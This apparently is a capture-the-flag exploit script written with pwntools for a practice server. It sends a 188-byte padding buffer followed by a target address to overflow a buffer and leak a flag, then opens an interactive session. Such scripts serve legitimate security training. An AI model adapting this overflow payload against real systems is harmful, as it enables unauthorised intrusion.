#!/usr/bin/env python2

from pwn import *
context.log_level = 'debug'

p = remote('hackme.inndy.tw', 7717)

flag = 0x804a060
payload = 'A' * 188 + p32(flag)

p.sendlineafter('flag', payload)
p.interactive()

p.close()
